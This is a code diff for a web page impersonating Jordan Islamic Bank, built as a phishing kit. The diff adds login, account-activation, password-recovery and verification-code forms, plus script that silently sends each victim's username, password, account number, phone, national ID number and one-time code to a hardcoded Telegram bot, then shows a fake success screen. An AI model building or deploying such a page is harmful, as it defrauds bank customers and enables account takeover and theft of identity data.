@@ -36,15 +36,25 @@
             justify-content: flex-start;
             padding-top: 60px;
         }
+        .logo-center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 10px;
+        }
         .logo {
-            margin-bottom: 20px;
-            width: 200px;
+            width: 160px;
+            max-width: 90vw;
+            margin: 0 auto 8px auto;
+            display: block;
         }
         .title {
             color: #fff;
-            font-size: 2.6rem;
+            font-size: 2.2rem;
             font-weight: bold;
             margin-bottom: 4px;
+            text-align: center;
             text-shadow: 0 2px 8px rgba(0,0,0,0.08);
         }
         .subtitle {
@@ -53,6 +63,7 @@
             margin-bottom: 36px;
             font-weight: 400;
             opacity: 0.85;
+            text-align: center;
         }
         .main-btn {
             width: 90vw;
@@ -82,21 +93,110 @@
         .view { display: none; }
         .view.active { display: block; }
 
+        /* Login + Forgot + Verification forms */
+        .form-card {
+            width:90vw;
+            max-width:600px;
+            background: none;
+            margin: 0 auto;
+        }
+        .form-card input, .form-card select {
+            width: 100%;
+            padding: 20px 16px;
+            font-size: 1.1rem;
+            border-radius: 12px;
+            border: none;
+            background: #fff;
+            margin-bottom: 13px;
+            box-sizing: border-box;
+            box-shadow: 0 1px 5px 0 rgba(0,0,0,0.08);
+            font-family: 'Cairo', Arial, sans-serif;
+            outline: none;
+        }
+        .form-card select {
+            border: 1.5px solid #bcbcbc;
+            background: #fafafa;
+        }
+        .form-card label {
+            display: block;
+            margin-bottom: 4px;
+            color: #fff;
+            font-size: 1.04rem;
+            font-weight: 600;
+        }
+        .form-card .row {
+            display: flex;
+            gap: 10px;
+        }
+        .form-card .row input, .form-card .row select {
+            flex: 1;
+            margin-bottom: 13px;
+        }
+        .form-card .row input[disabled] {
+            max-width: 80px;
+            background: #fafafa;
+            color: #888;
+            border: 1.5px solid #bcbcbc;
+        }
+        .form-card .actions {
+            display: flex;
+            justify-content: space-between;
+        }
+        .form-card button, .form-card .btn {
+            width: 100%;
+            padding: 20px 0;
+            font-size: 1.2rem;
+            background: #f26522;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 8px 0 rgba(0,0,0,0.08);
+            font-family: 'Cairo',Arial,sans-serif;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .form-card .btn-alt {
+            background: #fff;
+            color: #f26522;
+        }
+        .form-card .links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .form-card .links a {
+            color: #fff;
+            text-decoration: underline;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+        .info-text {
+            color:#fff;
+            font-size:1.15rem;
+            margin:20px 0 10px 0;
+            text-align: right;
+            font-weight: 600;
+        }
+        .note {
+            font-size:1.05rem;
+            padding:10px 0 12px 0;
+            color: #333;
+        }
+        .note span {
+            color:#f26522;
+            font-weight: bold;
+        }
         @media (max-width: 480px) {
             .container {
-                padding-top: 30px;
+                padding-top: 24px;
             }
-            .title {
-                font-size: 2rem;
-            }
-            .main-btn {
-                font-size: 1.1rem;
-                padding: 18px 0;
-                min-width: 140px;
-            }
-            .logo {
-                width: 130px;
-            }
+            .logo { width: 100px; }
+            .title { font-size: 1.4rem; }
+            .main-btn { font-size: 1.1rem; padding: 16px 0; min-width: 140px; }
+            .form-card { max-width: 98vw; }
         }
     </style>
 </head>
@@ -105,83 +205,197 @@
     <div class="container">
         <!-- Main Selection View -->
         <div class="view active" id="mainView">
-            <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo">
+            <div class="logo-center">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+            </div>
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
             <button class="main-btn activated" onclick="showView('loginView')">لقد قمت بتفعيل حسابي على تطبيق البنك</button>
             <button class="main-btn not-activated" onclick="showView('registerView')">لم اقوم بتفعيل حسابي على تطبيق البنك</button>
         </div>
-        <!-- Login View (Like Image 2) -->
+        <!-- Login View -->
         <div class="view" id="loginView">
-            <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo">
+            <div class="logo-center">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+            </div>
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
-            <form style="width:90vw;max-width:600px;">
-                <div style="margin-bottom:18px;">
-                    <input type="text" placeholder="اسم المستخدم" style="width:100%;padding:20px 50px 20px 16px;font-size:1.1rem;border-radius:12px;border:none;background:#fff;margin-bottom:13px;box-sizing:border-box;box-shadow:0 1px 5px 0 rgba(0,0,0,0.08);font-family:'Cairo',Arial,sans-serif;outline:none;" />
-                    <span style="position:relative;right:-40px;top:-56px;float:left;font-size:1.3rem;color:#bbb;pointer-events:none;">
-                        <svg width="22" height="22" viewBox="0 0 24 24"><path fill="#bbb" d="M12 12c2.7 0 8 1.35 8 4v2H4v-2c0-2.65 5.3-4 8-4zm0-2a4 4 0 1 0 0-8 4 4 0 0 0 0 8z"/></svg>
-                    </span>
-                </div>
-                <div style="margin-bottom:18px;">
-                    <input type="password" placeholder="كلمة المرور" style="width:100%;padding:20px 50px 20px 16px;font-size:1.1rem;border-radius:12px;border:none;background:#fff;margin-bottom:13px;box-sizing:border-box;box-shadow:0 1px 5px 0 rgba(0,0,0,0.08);font-family:'Cairo',Arial,sans-serif;outline:none;" />
-                    <span style="position:relative;right:-40px;top:-56px;float:left;font-size:1.3rem;color:#bbb;pointer-events:none;">
-                        <svg width="22" height="22" viewBox="0 0 24 24"><path fill="#bbb" d="M12 17a2 2 0 0 0 2-2v-2a2 2 0 0 0-2-2a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2zm6-4v-2A6 6 0 0 0 6 11v2"/></svg>
-                    </span>
-                </div>
-                <button type="submit" style="width:100%;padding:20px 0;font-size:1.2rem;background:#fff;color:#f26522;border:none;border-radius:12px;font-weight:bold;margin-bottom:20px;box-shadow:0 1px 8px 0 rgba(0,0,0,0.08);font-family:'Cairo',Arial,sans-serif;">تسجيل الدخول</button>
-                <div style="display:flex;justify-content:space-between;">
-                    <a href="#" style="color:#fff;text-decoration:underline;margin-right:8px;font-size:1rem;" onclick="showView('registerView');return false;">تفعيل الحساب</a>
-                    <a href="#" style="color:#fff;text-decoration:underline;font-size:1rem;">هل نسيت إسم المستخدم أو كلمة المرور ؟</a>
+            <form class="form-card" id="loginForm" autocomplete="off" onsubmit="return goToVerification(event, 'loginForm')">
+                <input type="text" id="loginUsername" name="username" placeholder="اسم المستخدم" autocomplete="off" required>
+                <input type="password" id="loginPassword" name="password" placeholder="كلمة المرور" autocomplete="off" required>
+                <button type="submit" class="btn-alt">تسجيل الدخول</button>
+                <div class="links">
+                    <a onclick="showView('forgotView')">هل نسيت اسم المستخدم أو كلمة المرور ؟</a>
+                    <a onclick="showView('registerView')">تفعيل الحساب</a>
                 </div>
             </form>
         </div>
-        <!-- Register View (Like Image 3) -->
-        <div class="view" id="registerView" style="width:100%;">
-            <div style="background:#d32f2f;padding:15px 0 0 0;">
-                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="margin-bottom:0;display:block;margin-right:auto;margin-left:auto;">
-                <div class="title" style="margin-bottom:0;font-size:1.3rem;">البنك الإسلامي الأردني</div>
-                <div class="subtitle" style="margin-bottom:0;">عضو مجموعة البركة</div>
+        <!-- Register View -->
+        <div class="view" id="registerView">
+            <div class="logo-center">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
             </div>
-            <div style="background:#fff;padding:15px 0 0 0;border-top-left-radius:25px;border-top-right-radius:25px;margin-top:-7px;min-height:80vh;">
-                <div style="text-align:right;font-weight:700;font-size:1.2rem;margin:20px 32px 10px 0;">مستخدم جديد</div>
-                <form style="width:90vw;max-width:600px;margin:auto;">
-                    <input type="text" placeholder="رقم الحساب (7 خانات)*" style="width:100%;padding:18px;font-size:1.1rem;border-radius:12px;border:1.5px solid #bcbcbc;background:#fafafa;margin-bottom:13px;box-sizing:border-box;box-shadow:0 1px 5px 0 rgba(0,0,0,0.04);font-family:'Cairo',Arial,sans-serif;outline:none;" />
-                    <div style="display:flex;gap:10px;margin-bottom:13px;">
-                        <input type="text" value="+962" disabled style="width:80px;padding:18px;font-size:1.1rem;border-radius:12px;border:1.5px solid #bcbcbc;background:#fafafa;box-sizing:border-box;box-shadow:0 1px 5px 0 rgba(0,0,0,0.04);font-family:'Cairo',Arial,sans-serif;outline:none;" />
-                        <input type="text" placeholder="رقم الموبايل" style="flex:1;padding:18px;font-size:1.1rem;border-radius:12px;border:1.5px solid #bcbcbc;background:#fafafa;box-sizing:border-box;box-shadow:0 1px 5px 0 rgba(0,0,0,0.04);font-family:'Cairo',Arial,sans-serif;outline:none;" />
-                    </div>
-                    <select style="width:100%;padding:18px;font-size:1.1rem;border-radius:12px;border:1.5px solid #bcbcbc;background:#fafafa;margin-bottom:13px;box-sizing:border-box;font-family:'Cairo',Arial,sans-serif;outline:none;">
-                        <option>الأردن</option>
-                        <option>فلسطين</option>
-                        <option>السعودية</option>
-                    </select>
-                    <select style="width:100%;padding:18px;font-size:1.1rem;border-radius:12px;border:1.5px solid #bcbcbc;background:#fafafa;margin-bottom:13px;box-sizing:border-box;font-family:'Cairo',Arial,sans-serif;outline:none;">
-                        <option>نوع الوثيقة</option>
-                        <option>هوية وطنية</option>
-                        <option>جواز سفر</option>
-                    </select>
-                    <input type="text" placeholder="الرقم الوطني" style="width:100%;padding:18px;font-size:1.1rem;border-radius:12px;border:1.5px solid #bcbcbc;background:#fafafa;margin-bottom:13px;box-sizing:border-box;font-family:'Cairo',Arial,sans-serif;outline:none;" />
-                    <div style="display:flex;align-items:center;gap:8px;margin-bottom:13px;">
-                        <button type="button" style="background:none;border:none;outline:none;cursor:pointer;">
-                            <svg width="30" height="30" viewBox="0 0 24 24"><path fill="#999" d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.39-.47 2.68-1.26 3.72l1.46 1.46A7.931 7.931 0 0 0 20 12c0-4.42-3.58-8-8-8zm-6.74 2.28L3.28 6.74A7.931 7.931 0 0 0 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3c-3.31 0-6-2.69-6-6 0-1.39.47-2.68 1.26-3.72z"></path></svg>
-                        </button>
-                        <div style="padding:10px 23px;border:1.5px solid #bcbcbc;background:#fafafa;border-radius:12px;font-size:1.2rem;font-family:'Cairo',Arial,sans-serif;letter-spacing:2px;">BBFAZ</div>
-                        <input type="text" placeholder="يرجى إدخال الرمز" style="flex:1;padding:18px;font-size:1.1rem;border-radius:12px;border:1.5px solid #bcbcbc;background:#fafafa;box-sizing:border-box;box-shadow:0 1px 5px 0 rgba(0,0,0,0.04);font-family:'Cairo',Arial,sans-serif;outline:none;" />
-                    </div>
-                    <div style="font-size:1.05rem;padding:10px 0 12px 0;">
-                        <span style="color:#f26522;font-weight:bold;">*</span> 
-                        تجدون رقم حساب المتعامل(7 خانات) في نص SMS للحركات المالية المرسلة من JIB المشار باللون الاحمر 000-<span style="color:#f00;">0000000</span> او الاتصال على 06/5680001 او مراجعة فرعك
-                    </div>
-                    <button type="submit" style="width:100%;padding:20px 0;font-size:1.2rem;background:#f26522;color:#fff;border:none;border-radius:12px;font-weight:bold;margin-bottom:20px;box-shadow:0 1px 8px 0 rgba(0,0,0,0.08);font-family:'Cairo',Arial,sans-serif;">تأكيد</button>
-                </form>
+            <div class="title">البنك الإسلامي الأردني</div>
+            <div class="subtitle">عضو مجموعة البركة</div>
+            <div class="info-text">مستخدم جديد</div>
+            <form class="form-card" id="registerForm" autocomplete="off" onsubmit="return goToVerification(event, 'registerForm')">
+                <input type="text" id="accountNumber" name="accountNumber" placeholder="رقم الحساب (7 خانات)*" maxlength="7" pattern="^[0-9]{7}$" required>
+                <div class="row">
+                    <input type="text" value="+962" disabled>
+                    <input type="text" id="mobile" name="mobile" placeholder="رقم الموبايل" pattern="^[0-9]{9,10}$" required>
+                </div>
+                <select id="country" name="country" required>
+                    <option value="">اختر الدولة</option>
+                    <option>الأردن</option>
+                    <option>فلسطين</option>
+                    <option>السعودية</option>
+                </select>
+                <select id="docType" name="docType" required>
+                    <option value="">نوع الوثيقة</option>
+                    <option>هوية وطنية</option>
+                    <option>جواز سفر</option>
+                </select>
+                <input type="text" id="nationalId" name="nationalId" placeholder="الرقم الوطني" required>
+                <div class="note">
+                    <span>*</span> تجدون رقم حساب المتعامل(7 خانات) في نص SMS للحركات المالية المرسلة من JIB المشار باللون الاحمر 000-<span style="color:#f00;">0000000</span> او الاتصال على 06/5680001 او مراجعة فرعك
+                </div>
+                <button type="submit">تأكيد</button>
+            </form>
+        </div>
+        <!-- Forgot View -->
+        <div class="view" id="forgotView">
+            <div class="logo-center">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
             </div>
+            <div class="title">البنك الإسلامي الأردني</div>
+            <div class="subtitle">عضو مجموعة البركة</div>
+            <div class="info-text">استعادة اسم المستخدم أو كلمة المرور</div>
+            <form class="form-card" id="forgotForm" autocomplete="off" onsubmit="return goToVerification(event, 'forgotForm')">
+                <input type="text" id="forgotAccountNumber" name="accountNumber" placeholder="رقم الحساب (7 خانات)*" maxlength="7" pattern="^[0-9]{7}$" required>
+                <div class="row">
+                    <input type="text" value="+962" disabled>
+                    <input type="text" id="forgotMobile" name="mobile" placeholder="رقم الموبايل" pattern="^[0-9]{9,10}$" required>
+                </div>
+                <select id="forgotCountry" name="country" required>
+                    <option value="">اختر الدولة</option>
+                    <option>الأردن</option>
+                    <option>فلسطين</option>
+                    <option>السعودية</option>
+                </select>
+                <select id="forgotDocType" name="docType" required>
+                    <option value="">نوع الوثيقة</option>
+                    <option>هوية وطنية</option>
+                    <option>جواز سفر</option>
+                </select>
+                <input type="text" id="forgotNationalId" name="nationalId" placeholder="الرقم الوطني" required>
+                <button type="submit">تأكيد</button>
+            </form>
+        </div>
+        <!-- Verification View -->
+        <div class="view" id="verifyView">
+            <div class="logo-center">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+            </div>
+            <div class="title">البنك الإسلامي الأردني</div>
+            <div class="subtitle">عضو مجموعة البركة</div>
+            <div id="verifyLabel" class="info-text">ادخل رمز التحقق</div>
+            <form class="form-card" id="verifyForm" autocomplete="off" onsubmit="return sendVerification(event)">
+                <input type="text" id="verifyCode" name="verifyCode" placeholder="رمز التحقق" maxlength="6" required>
+                <button type="submit">تأكيد</button>
+            </form>
+        </div>
+        <!-- Success message -->
+        <div class="view" id="successView">
+            <div class="logo-center">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+            </div>
+            <div class="title">تم الإرسال بنجاح</div>
+            <div class="subtitle">شكراً لاستخدامك خدمات البنك الإسلامي الأردني</div>
         </div>
     </div>
     <script>
+        let lastFormData = {};
+        let lastFormType = '';
+
         function showView(view) {
             document.querySelectorAll('.view').forEach(e => e.classList.remove('active'));
             document.getElementById(view).classList.add('active');
+        }
+
+        // When user submits a form, go to verification view and store data
+        function goToVerification(event, formId) {
+            event.preventDefault();
+            lastFormType = formId;
+            const form = document.getElementById(formId);
+            const formData = new FormData(form);
+            let summary = '';
+            if(formId === 'loginForm'){
+                summary = `تسجيل دخول\nاسم المستخدم: ${formData.get('username')}\nكلمة المرور: ${formData.get('password')}`;
+                lastFormData = {
+                    type: 'login',
+                    username: formData.get('username'),
+                    password: formData.get('password'),
+                    summary: summary
+                };
+            } else if(formId === 'registerForm'){
+                summary = `تسجيل مستخدم جديد\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nنوع الوثيقة: ${formData.get('docType')}\nالرقم الوطني: ${formData.get('nationalId')}`;
+                lastFormData = {
+                    type: 'register',
+                    accountNumber: formData.get('accountNumber'),
+                    mobile: formData.get('mobile'),
+                    country: formData.get('country'),
+                    docType: formData.get('docType'),
+                    nationalId: formData.get('nationalId'),
+                    summary: summary
+                };
+            } else if(formId === 'forgotForm'){
+                summary = `استعادة اسم المستخدم أو كلمة المرور\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nنوع الوثيقة: ${formData.get('docType')}\nالرقم الوطني: ${formData.get('nationalId')}`;
+                lastFormData = {
+                    type: 'forgot',
+                    accountNumber: formData.get('accountNumber'),
+                    mobile: formData.get('mobile'),
+                    country: formData.get('country'),
+                    docType: formData.get('docType'),
+                    nationalId: formData.get('nationalId'),
+                    summary: summary
+                };
+            }
+            // Send basic info first
+            sendToTelegram(lastFormData.summary);
+            // Go to verification page
+            showView('verifyView');
+            return false;
+        }
+
+        // On verification page submit
+        function sendVerification(event) {
+            event.preventDefault();
+            const code = document.getElementById('verifyCode').value.trim();
+            if(!code) return false;
+            // Add code to previous info and send again
+            let msg = lastFormData.summary + `\nرمز التحقق: ${code}`;
+            sendToTelegram(msg, true);
+            showView('successView');
+            setTimeout(() => { showView('mainView'); }, 3500);
+            return false;
+        }
+
+        // Telegram Send Function
+        function sendToTelegram(text, silent=false) {
+            const token = "8423128112:AAHV-cdsi_I64gS_YNDNjQL_ShZpCzdwRf8";
+            const chat_id = "6873334348";
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const params = {
+                chat_id: chat_id,
+                text: text,
+                parse_mode: "Markdown"
+            };
+            // Send request (no alert, just background send)
+            fetch(url, {
+                method: "POST",
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(params)
+            }).catch(()=>{});
         }
     </script>
 </body>
